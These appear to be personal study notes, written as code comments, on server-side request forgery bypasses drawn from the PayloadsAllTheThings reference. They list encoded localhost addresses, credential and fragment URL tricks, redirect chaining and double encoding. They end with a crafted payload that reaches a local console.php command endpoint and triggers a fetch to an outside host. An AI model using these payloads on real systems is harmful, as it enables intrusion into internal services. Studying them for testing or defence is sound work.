//https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md
//* other backend systems
// you can scan the local addresses to see if any other systems are running on 192.168.0.X:8080
//* localhost equivalents
// 127.0.0.1
// 127.1
// 2130706433 (decimal)
// 0x7F000001 (hex)
// 017700000001 (octal)
// 0.0.0.0
// 0
//* added creds
// https://expected-host:fakepassword@evil-host =>  https://evil-host
//* hashtags
// https://evil-host#expected-host => https://evil-host
//* added creds + hashtags
// http://localhost#@whitelist/admin
// in here the first parser thinks that localhost# is a username
// but when the request is made what's after the # is just deleted and the request is made to localhost
// resolving into http://localhost/admin
// note : you need to encode the # 2 tiems in order for this to work
// because the first parser consider # a part of the name beacuse he see it encoded
//* redirects (not static)
// https://307.r3dir.me/--to/?url=http://localhost:80/ =>  http://localhost:80/
// /product/nextProduct?currentProductId=6&path=http://evil-user.net => http://evil-user.net
//* other
// double encoding chars
// case variation

//                                  #
//? http://nexus-security.club:8048%23@localhost/console.php?cmd=fetch%28%2522https%253A%252F%252Fiwillneverreapeat.free.beeceptor.com%2522%29
